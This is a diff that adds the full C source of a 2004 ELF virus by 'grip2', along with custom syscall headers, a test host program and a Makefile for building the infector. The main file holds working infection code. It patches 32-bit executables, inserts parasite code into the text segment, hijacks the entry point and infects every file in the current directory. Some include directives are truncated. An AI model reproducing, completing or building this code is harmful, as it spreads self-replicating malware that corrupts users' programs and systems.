@@ -1,0 +1,781 @@
+------------------------------ gvirus.c ------------------------------
+
+/*
+
+* virus code in C (2004)
+
+* written by grip2
+
+*/
+
+#include "gsyscall.h"
+
+#include "gvirus.h"
+
+#include
+
+#define PAGE_SIZE 4096
+
+#define PAGE_ALIGN(a) (((a) + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1))
+
+#ifndef NDEBUG
+
+#define PARACODE_LENGTH 1744
+
+#else
+
+#define PARACODE_LENGTH 1248
+
+#endif
+
+#ifndef NDEBUG
+
+#define V_DEBUG_WRITE(...) \
+
+do {\
+
+g_write(__VA_ARGS__);\
+
+} while(0)
+
+#else
+
+#define V_DEBUG_WRITE(...)
+
+#endif
+
+static inline int infect_virus(
+
+const char *file,
+
+void *v_code,
+
+unsigned int v_code_size,
+
+unsigned long v_retaddr_addr_offset)
+
+{
+
+int fd = -1;
+
+int tmp_fd = -1;
+
+Elf32_Ehdr *ehdr = NULL;
+
+Elf32_Phdr *phdr;
+
+Elf32_Shdr *shdr;
+
+int i;
+
+int txt_index;
+
+struct stat stat;
+
+int align_code_size;
+
+unsigned long org_entry;
+
+void *new_code_pos;
+
+int tmp_flag;
+
+int size;
+
+unsigned char tmp_v_code[PAGE_SIZE];
+
+char tmpfile[32] = {'/','t','m','p','/','.','g','v','i','r','u','s','\0'};
+
+#ifndef NDEBUG
+
+char err_type[32] = {'f','i','l','e',' ','t','y','p','e',' ','n','o','t',' ',
+
+'s','u','p','p','o','r','t','e','d','\n','\0'};
+
+char luck[32] = {'B','e','t','t','e','r',' ','l','u','c','k',' ',
+
+'n','e','x','t',' ','f','i','l','e','\n','\0'};
+
+#endif
+
+fd = g_open(file, O_RDWR, 0);
+
+if (fd == -1) {
+
+goto err;
+
+}
+
+if (g_fstat(fd, &stat) == -1) {
+
+goto err;
+
+}
+
+ehdr = g_mmap2(0, stat.st_size, PROT_WRITE|PROT_READ, MAP_SHARED, fd, 0);
+
+if (ehdr == MAP_FAILED) {
+
+goto err;
+
+}
+
+/* Check ELF magic-ident */
+
+if (ehdr->e_ident[EI_MAG0] != 0x7f
+
+|| ehdr->e_ident[EI_MAG1] != 'E'
+
+|| ehdr->e_ident[EI_MAG2] != 'L'
+
+|| ehdr->e_ident[EI_MAG3] != 'F'
+
+|| ehdr->e_ident[EI_CLASS] != ELFCLASS32
+
+|| ehdr->e_ident[EI_DATA] != ELFDATA2LSB
+
+|| ehdr->e_ident[EI_VERSION] != EV_CURRENT
+
+|| ehdr->e_type != ET_EXEC
+
+|| ehdr->e_machine != EM_386
+
+|| ehdr->e_version != EV_CURRENT
+
+) {
+
+V_DEBUG_WRITE(1, &err_type, sizeof(err_type));
+
+goto err;
+
+}
+
+align_code_size = PAGE_ALIGN(v_code_size);
+
+/* Get program header and section header start address */
+
+phdr = (Elf32_Phdr *) ((unsigned long) ehdr + ehdr->e_phoff);
+
+shdr = (Elf32_Shdr *) ((unsigned long) ehdr + ehdr->e_shoff);
+
+/* Locate the text segment */
+
+txt_index = 0;
+
+while (1) {
+
+if (txt_index == ehdr->e_phnum - 1)
+
+goto err;
+
+if (phdr[txt_index].p_type == PT_LOAD
+
+&& phdr[txt_index].p_flags == (PF_R|PF_X)) { /* text segment */
+
+if (phdr[txt_index].p_vaddr + phdr[txt_index].p_filesz + align_code_size
+
+> phdr[txt_index+1].p_vaddr) {
+
+V_DEBUG_WRITE(1, &luck, sizeof(luck));
+
+goto err;
+
+}
+
+break;
+
+}
+
+txt_index++;
+
+}
+
+/* Modify the entry point of the ELF */
+
+org_entry = ehdr->e_entry;
+
+ehdr->e_entry = phdr[txt_index].p_vaddr + phdr[txt_index].p_filesz;
+
+new_code_pos =
+
+(void *) ehdr + phdr[txt_index].p_offset + phdr[txt_index].p_filesz;
+
+/* Increase the p_filesz and p_memsz of text segment
+
+* for new code */
+
+phdr[txt_index].p_filesz += align_code_size;
+
+phdr[txt_index].p_memsz += align_code_size;
+
+for (i = 0; i < ehdr->e_phnum; i++)
+
+if (phdr[i].p_offset >= (unsigned long) new_code_pos - (unsigned long) ehdr)
+
+phdr[i].p_offset += align_code_size;
+
+tmp_flag = 0;
+
+for (i = 0; i < ehdr->e_shnum; i++) {
+
+if (shdr[i].sh_offset >= (unsigned long) new_code_pos - (unsigned long) ehdr) {
+
+shdr[i].sh_offset += align_code_size;
+
+if (!tmp_flag && i) { /* associating the new_code to the last
+
+* section in the text segment */
+
+shdr[i-1].sh_size += align_code_size;
+
+tmp_flag = 1;
+
+}
+
+}
+
+}
+
+/* Increase p_shoff in the ELF header */
+
+ehdr->e_shoff += align_code_size;
+
+/* Make a new file */
+
+tmp_fd = g_open(tmpfile, O_WRONLY|O_CREAT|O_TRUNC, stat.st_mode);
+
+if (tmp_fd == -1) {
+
+goto err;
+
+}
+
+size = new_code_pos - (void *) ehdr;
+
+if (g_write(tmp_fd, ehdr, size) != size)
+
+goto err;
+
+__memcpy(tmp_v_code, v_code, v_code_size);
+
+__memcpy(tmp_v_code + v_retaddr_addr_offset, &org_entry, sizeof(org_entry));
+
+if (g_write(tmp_fd, tmp_v_code, align_code_size) != align_code_size) {
+
+goto err;
+
+}
+
+if (g_write(tmp_fd, (void *) ehdr + size, stat.st_size - size)
+
+!= stat.st_size - size) {
+
+goto err;
+
+}
+
+g_close(tmp_fd);
+
+g_munmap(ehdr, stat.st_size);
+
+g_close(fd);
+
+if (g_rename(tmpfile, file) == -1) {
+
+goto err;
+
+}
+
+return 0;
+
+err:
+
+if (tmp_fd != -1)
+
+g_close(tmp_fd);
+
+if (ehdr)
+
+g_munmap(ehdr, stat.st_size);
+
+if (fd != -1)
+
+g_close(fd);
+
+return -1;
+
+}
+
+static inline void virus_code(void)
+
+{
+
+char dirdata[4096];
+
+struct dirent *dirp;
+
+int curfd;
+
+int nbyte, c;
+
+unsigned long para_code_start_addr;
+
+__asm__ volatile (
+
+"push %%eax\n\t"
+
+"push %%ecx\n\t"
+
+"push %%edx\n\t"
+
+::);
+
+char curdir[2] = {'.', 0};
+
+char newline = '\n';
+
+curdir[0] = '.';
+
+curdir[1] = 0;
+
+newline = '\n';
+
+if ((curfd = g_open(curdir, O_RDONLY, 0)) < 0)
+
+goto out;
+
+/* Get start address of virus code */
+
+__asm__ volatile (
+
+"jmp get_start_addr\n"
+
+"infect_start:\n\t"
+
+"popl %0\n\t"
+
+:"=m" (para_code_start_addr)
+
+:);
+
+para_code_start_addr -= PARACODE_RETADDR_ADDR_OFFSET - 1;
+
+/* Infecting */
+
+while ((nbyte = g_getdents(curfd, (struct dirent *)
+
+&dirdata, sizeof(dirdata))) > 0) {
+
+c = 0;
+
+dirp = (struct dirent *) &dirdata;
+
+do {
+
+V_DEBUG_WRITE(1, dirp->d_name, dirp->d_reclen - (unsigned long)
+
+&(((struct dirent *) 0)->d_name));
+
+V_DEBUG_WRITE(1, &newline, sizeof(newline));
+
+infect_virus(dirp->d_name,
+
+(void *) para_code_start_addr,
+
+PARACODE_LENGTH,
+
+PARACODE_RETADDR_ADDR_OFFSET);
+
+c += dirp->d_reclen;
+
+if (c >= nbyte)
+
+break;
+
+dirp = (struct dirent *)((char *)dirp + dirp->d_reclen);
+
+} while (1);
+
+}
+
+g_close(curfd);
+
+out:
+
+__asm__ volatile (
+
+"popl %%edx\n\t"
+
+"popl %%ecx\n\t"
+
+"popl %%eax\n\t"
+
+"addl $0x102c, %%esp\n\t"
+
+"popl %%ebx\n\t"
+
+"popl %%esi\n\t"
+
+"popl %%edi\n\t"
+
+"popl %%ebp\n\t"
+
+"jmp return\n"
+
+"get_start_addr:\n\t"
+
+"call infect_start\n"
+
+"return:\n\t"
+
+"push $0xAABBCCDD\n\t" /* push ret_addr */
+
+"ret\n"
+
+::);
+
+}
+
+void parasite_code(void)
+
+{
+
+virus_code();
+
+}
+
+void parasite_code_end(void) {parasite_code();}
+
+------------------------------ gvirus.c ------------------------------
+
+------------------------------ gunistd.h ------------------------------
+
+#ifndef _G2_UNISTD_
+
+#define _G2_UNISTD_
+
+#define g__syscall_return(type, res) \
+
+do { \
+
+if ((unsigned long)(res) >= (unsigned long)(-125)) { \
+
+res = -1; \
+
+} \
+
+return (type) (res); \
+
+} while (0)
+
+#define g_syscall0(type,name) \
+
+type g_##name(void) \
+
+{ \
+
+long __res; \
+
+__asm__ volatile ("int $0x80" \
+
+: "=a" (__res) \
+
+: "0" (__NR_##name)); \
+
+g__syscall_return(type,__res); \
+
+}
+
+#define g_syscall1(type,name,type1,arg1) \
+
+type g_##name(type1 arg1) \
+
+{ \
+
+long __res; \
+
+__asm__ volatile ("int $0x80" \
+
+: "=a" (__res) \
+
+: "0" (__NR_##name),"b" ((long)(arg1))); \
+
+g__syscall_return(type,__res); \
+
+}
+
+#define g_syscall2(type,name,type1,arg1,type2,arg2) \
+
+type g_##name(type1 arg1,type2 arg2) \
+
+{ \
+
+long __res; \
+
+__asm__ volatile ("int $0x80" \
+
+: "=a" (__res) \
+
+: "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2))); \
+
+g__syscall_return(type,__res); \
+
+}
+
+#define g_syscall3(type,name,type1,arg1,type2,arg2,type3,arg3) \
+
+type g_##name(type1 arg1,type2 arg2,type3 arg3) \
+
+{ \
+
+long __res; \
+
+__asm__ volatile ("int $0x80" \
+
+: "=a" (__res) \
+
+: "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
+
+"d" ((long)(arg3))); \
+
+g__syscall_return(type,__res); \
+
+}
+
+#define g_syscall4(type,name,type1,arg1,type2,arg2,type3,arg3,type4,arg4) \
+
+type g_##name (type1 arg1, type2 arg2, type3 arg3, type4 arg4) \
+
+{ \
+
+long __res; \
+
+__asm__ volatile ("int $0x80" \
+
+: "=a" (__res) \
+
+: "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
+
+"d" ((long)(arg3)),"S" ((long)(arg4))); \
+
+g__syscall_return(type,__res); \
+
+}
+
+#define g_syscall5(type,name,type1,arg1,type2,arg2,type3,arg3,type4,arg4, \
+
+type5,arg5) \
+
+type g_##name (type1 arg1,type2 arg2,type3 arg3,type4 arg4,type5 arg5) \
+
+{ \
+
+long __res; \
+
+__asm__ volatile ("int $0x80" \
+
+: "=a" (__res) \
+
+: "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
+
+"d" ((long)(arg3)),"S" ((long)(arg4)),"D" ((long)(arg5))); \
+
+g__syscall_return(type,__res); \
+
+}
+
+#define g_syscall6(type,name,type1,arg1,type2,arg2,type3,arg3,type4,arg4, \
+
+type5,arg5,type6,arg6) \
+
+type g_##name (type1 arg1,type2 arg2,type3 arg3,type4 arg4,type5 arg5,type6 arg6) \
+
+{ \
+
+long __res; \
+
+__asm__ volatile ("push %%ebp ; movl %%eax,%%ebp ; movl %1,%%eax ; int $0x80 ; pop %%ebp" \
+
+: "=a" (__res) \
+
+: "i" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
+
+"d" ((long)(arg3)),"S" ((long)(arg4)),"D" ((long)(arg5)), \
+
+"0" ((long)(arg6))); \
+
+g__syscall_return(type,__res); \
+
+}
+
+#endif /* _G2_UNISTD_ */ 
+
+------------------------------ gunistd.h ------------------------------
+
+------------------------------ gsyscall.h ------------------------------
+
+#ifndef _G2_SYSCALL_
+
+#define _G2_SYSCALL_
+
+#include
+
+#include
+
+#include
+
+#include
+
+#include "gunistd.h"
+
+#define NULL 0
+
+struct dirent {
+
+long d_ino;
+
+unsigned long d_off;
+
+unsigned short d_reclen;
+
+char d_name[256]; /* We must not include limits.h! */
+
+};
+
+struct stat {
+
+unsigned long st_dev;
+
+unsigned long st_ino;
+
+unsigned short st_mode;
+
+unsigned short st_nlink;
+
+unsigned short st_uid;
+
+unsigned short st_gid;
+
+unsigned long st_rdev;
+
+unsigned long st_size;
+
+unsigned long st_blksize;
+
+unsigned long st_blocks;
+
+unsigned long st_atime;
+
+unsigned long st_atime_nsec;
+
+unsigned long st_mtime;
+
+unsigned long st_mtime_nsec;
+
+unsigned long st_ctime;
+
+unsigned long st_ctime_nsec;
+
+unsigned long __unused4;
+
+unsigned long __unused5;
+
+};
+
+static inline g_syscall3(int, write, int, fd, const void *, buf, off_t, count);
+
+static inline g_syscall3(int, getdents, uint, fd, struct dirent *, dirp, uint, count);
+
+static inline g_syscall3(int, open, const char *, file, int, flag, int, mode);
+
+static inline g_syscall1(int, close, int, fd);
+
+static inline g_syscall6(void *, mmap2, void *, addr, size_t, len, int, prot,
+
+int, flags, int, fd, off_t, offset);
+
+static inline g_syscall2(int, munmap, void *, addr, size_t, len);
+
+static inline g_syscall2(int, rename, const char *, oldpath, const char *, newpath);
+
+static inline g_syscall2(int, fstat, int, filedes, struct stat *, buf);
+
+static inline void * __memcpy(void * to, const void * from, size_t n)
+
+{
+
+int d0, d1, d2;
+
+__asm__ __volatile__(
+
+"rep ; movsl\n\t"
+
+"testb $2,%b4\n\t"
+
+"je 1f\n\t"
+
+"movsw\n"
+
+"1:\ttestb $1,%b4\n\t"
+
+"je 2f\n\t"
+
+"movsb\n"
+
+"2:"
+
+: "=&c" (d0), "=&D" (d1), "=&S" (d2)
+
+:"0" (n/4), "q" (n),"1" ((long) to),"2" ((long) from)
+
+: "memory");
+
+return (to);
+
+}
+
+#endif /* _G2_SYSCALL_ */
+
+------------------------------ gsyscall.h ------------------------------
+
+------------------------------ foo.c ------------------------------
+
+#include
+
+int main()
+
+{
+
+puts("real elf point");
+
+return 0;
+
+}
+
+------------------------------ foo.c ------------------------------
+
+------------------------------ Makefile ------------------------------
+
+all: foo gei
+
+gei: g-elf-infector.c gvirus.o
+
+gcc -O2 $< gvirus.o -o gei -Wall -DNDEBUG
+
+foo: foo.c
+
+gcc $< -o foo
+
+gvirus.o: gvirus.c
+
+gcc $< -O2 -c -o gvirus.o -fomit-frame-pointer -Wall -DNDEBUG
+
+clean:
+
+rm *.o -rf
+
+rm foo -rf
+
+rm gei -rf
+
+------------------------------ Makefile ------------------------------
